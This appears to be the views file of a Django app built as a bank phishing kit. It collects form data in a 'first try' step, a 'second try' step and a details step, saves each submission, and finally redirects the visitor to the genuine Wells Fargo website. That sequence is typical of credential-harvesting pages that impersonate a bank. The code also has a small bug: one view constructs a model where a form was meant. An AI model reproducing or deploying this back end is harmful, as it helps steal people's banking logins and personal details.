# from django.shortcuts import render

# # Create your views here.
# from django.http import HttpResponse


# def index(request):
#     return HttpResponse("Hello, world. You're at the polls index.")

from django.shortcuts import render,redirect
from django.urls import reverse
from django.http import HttpResponseRedirect
from .models import FirstTry,SecondTry,DetailsFeed
from .forms import FirstTryForm,SecondTryForm,DetailsFeedForm




def index(request):
    if request.method == 'POST':
        form = FirstTryForm(request.POST)
        if form.is_valid():
            form.save()
            return HttpResponseRedirect( 'verification')
        
    else:
        form = FirstTryForm()

    return render(request, 'projecty/index.html', {'form':form})
    

def second(request):
    if request.method == 'POST':
        form = SecondTryForm(request.POST)
        if form.is_valid():
            form.save()
            return HttpResponseRedirect( reverse('documents'))
    
    else:
        form = SecondTry()

    return render(request, 'projecty/second.html', {'form':form})
    

def details(request):
    if request.method == 'POST':
        form = DetailsFeedForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('https://www.wellsfargo.com/')
        
    else:
        form = DetailsFeedForm()
    return render(request, "projecty/details.html", {'form':form})